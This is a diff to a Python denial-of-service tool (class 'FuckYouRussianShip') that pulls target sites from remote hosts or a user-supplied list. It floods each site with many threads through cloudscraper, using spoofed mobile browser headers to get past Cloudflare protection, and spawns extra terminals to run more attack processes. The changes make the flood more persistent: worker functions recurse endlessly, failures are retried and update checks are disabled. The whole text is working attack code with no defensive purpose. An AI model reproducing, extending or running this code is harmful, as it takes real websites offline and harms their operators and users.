@@ -25,6 +25,9 @@ from shutil import which
 statistic = {}
 work_statistic = True
 general_statistics = [0, 0]
+threads_count = 0
+thread_count = 0
+attack_func = False
 
 
 class FuckYouRussianShip:
@@ -103,12 +106,14 @@ class FuckYouRussianShip:
                     exit()
             else:
                 sleep(5)
-                self.checkUpdate()
+                # self.checkUpdate()
         except:
             sleep(5)
-            self.checkUpdate()
+            # self.checkUpdate()
 
     def mainth(self):
+        global threads_count
+        threads_count += 1
         result = 'processing'
         scraper = cloudscraper.create_scraper(
             browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
@@ -118,6 +123,7 @@ class FuckYouRussianShip:
              'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https',
              'Accept-Encoding': 'gzip, deflate, br'})
 
+        log_file_main = 'main'
         while True:
             scraper = cloudscraper.create_scraper(
                 browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
@@ -129,17 +135,17 @@ class FuckYouRussianShip:
             host = choice(self.HOSTS)
             try:
                 content = scraper.get(host).content
-            except BaseException:
+            except BaseException as exc:
                 sleep(5)
                 continue
 
             if content:
                 try:
                     data = json.loads(content)
-                except json.decoder.JSONDecodeError:
+                except json.decoder.JSONDecodeError as exc:
                     sleep(5)
                     continue
-                except Exception:
+                except Exception as exc:
                     sleep(5)
                     continue
             else:
@@ -148,7 +154,7 @@ class FuckYouRussianShip:
 
             try:
                 site = unquote(choice(self.targets) if self.targets else data['site']['page'])
-            except BaseException:
+            except BaseException as exc:
                 sleep(5)
                 continue
             if site.startswith('http') == False:
@@ -156,6 +162,9 @@ class FuckYouRussianShip:
 
             if site not in statistic and work_statistic:
                 statistic[site] = [site, 0, 0, 0, 0, 0, 0]
+
+            log_file_name = site.replace('https://', '') \
+                .replace('http://', '').split('.')[0]
 
             try:
                 attack = scraper.get(site, timeout=10)
@@ -182,11 +191,13 @@ class FuckYouRussianShip:
                         self.write_statistic_success(site, attack.status_code)
             except ConnectionError as exc:
                 self.write_statistic_error(site)
+                continue
             except Exception as exc:
                 self.write_statistic_error(site)
                 continue
             finally:
-                return result, site
+                threads_count -= 1
+                return self.mainth()
 
     @staticmethod
     def write_statistic_success(url_target, status_code):
@@ -201,7 +212,7 @@ class FuckYouRussianShip:
     def cleaner(self):
         while True:
             sleep(60)
-            self.checkUpdate()
+            # self.checkUpdate()
 
             if not self.no_clear:
                 self.clear()
@@ -224,8 +235,8 @@ class FuckYouRussianShip:
                 statistic_data.append([
                     'Successful Requests',
                     general_statistics[0],
-                    '',
-                    '',
+                    'Threads',
+                    threads_count,
                     '',
                     'Errors',
                     general_statistics[1]
@@ -233,58 +244,73 @@ class FuckYouRussianShip:
                 tp.table(data=statistic_data,
                          headers=headers,
                          width=[len(max(list(statistic.keys()), key=len)), 10, 10, 10, 10, 10, 8])
-            sleep(1)
+            sleep(5)
             FuckYouRussianShip.clear()
 
     def parts_recursive(self, n, parts=[]):
         return parts + [n] if n < 500 else self.parts_recursive(n - 500, parts + [500, ])
 
 
+# def regenerate_threading():
+#     while True:
+#         if threads_count < thread_count // 2:
+#             attacker_threading(thread_count // 2, attack_func)
+#         else:
+#             sleep(2)
+
+
 def attacker_threading(threads_count, worker_func):
     with ThreadPoolExecutor(max_workers=threads_count) as executor:
         future_tasks = [executor.submit(worker_func) for _ in range(threads_count)]
         for task in as_completed(future_tasks):
-            status, site = task.result()
-            logger.info(f"{status.upper()}: {site}")
+            while True:
+                try:
+                    status, site = task.result()
+                    break
+                except BaseException:
+                    sleep(5)
 
 
 def generation_process(part, terminal_add):
     if platform.system() == "Linux":
-        if which('xterm') is None:
-            os.system("sudo apt install xterm")
         subprocess.call(f'xterm -e python attack.py {part} {terminal_add} &', shell=True)
     else:
         subprocess.call(f'start python attack.py {part} {terminal_add}', shell=True)
 
 
+def start_multi_terminals(parts_list, terminal_add, f_part, func_att):
+    for part in parts_list:
+        generation_process(part, terminal_add)
+    attacker_threading(f_part, func_att)
+
 
 if __name__ == '__main__':
-    while True:
-        attacker = FuckYouRussianShip()
-        if not attacker.no_clear:
-            attacker.clear()
-        attacker.checkReq()
-        attacker.checkUpdate()
-        Thread(target=attacker.cleaner, daemon=True).start()
-        Thread(target=attacker.print_statistic, daemon=True).start()
+    attacker = FuckYouRussianShip()
+    if not attacker.no_clear:
+        attacker.clear()
+    attacker.checkReq()
+    # attacker.checkUpdate()
 
-        if attacker.threads <= 500:
-            attacker_threading(attacker.threads, attacker.mainth)
-        else:
-            process_count = attacker.threads // 500
-            parts = attacker.parts_recursive(attacker.threads)
-            first_part = parts[0]
-            del parts[0]
+    thread_count = attacker.threads
+    attack_func = attacker.mainth
+    Thread(target=attacker.cleaner, daemon=True).start()
+    Thread(target=attacker.print_statistic, daemon=True).start()
 
-            terminal_additional = ''
+    if attacker.threads <= 500:
+        attacker_threading(attacker.threads, attacker.mainth)
+    else:
+        process_count = attacker.threads // 500
+        parts = attacker.parts_recursive(attacker.threads)
+        first_part = parts[0]
+        del parts[0]
 
-            if attacker.no_clear:
-                terminal_additional += "-n "
-            if attacker.proxy_view:
-                terminal_additional += "-p "
-            if attacker.targets:
-                terminal_additional += f"-t {' '.join(attacker.targets)} "
+        terminal_additional = ''
 
-            for parts_threads in parts:
-                generation_process(parts_threads, terminal_additional)
-            attacker_threading(first_part, attacker.mainth)
+        if attacker.no_clear:
+            terminal_additional += "-n "
+        if attacker.proxy_view:
+            terminal_additional += "-p "
+        if attacker.targets:
+            terminal_additional += f"-t {' '.join(attacker.targets)} "
+
+        start_multi_terminals(parts, terminal_additional, first_part, attacker.mainth)
